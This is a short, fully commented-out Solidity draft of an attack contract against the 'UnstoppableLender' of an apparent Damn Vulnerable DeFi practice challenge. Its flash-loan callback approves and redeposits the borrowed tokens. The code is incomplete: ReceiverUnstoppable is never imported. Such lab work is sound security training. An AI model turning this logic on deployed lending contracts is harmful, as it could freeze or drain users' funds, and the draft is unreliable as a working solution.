// pragma solidity >=0.8.17;
//
// import {UnstoppableLender} from "src/Contracts/unstoppable/UnstoppableLender.sol";
// import {DamnValuableToken} from "src/Contracts/DamnValuableToken.sol";
//
// contract UnstoppableAttack {
//   UnstoppableLender lender;
//   DamnValuableToken dvt;
//   ReceiverUnstoppable receiver;
//
//   constructor(address payable _target, address payable _token, address payable _receiver) {
//     lender = UnstoppableLender(_target);
//     dvt = DamnValuableToken(_token);
//     receiver = ReceiverUnstoppable(_receiver);
//   }
//
//   function receiveTokens(address, uint256 borrowAmount) external payable {
//     dvt.approve(address(lender), borrowAmount);
//     receiver.depositTokens(borrowAmount);
//   }
// }
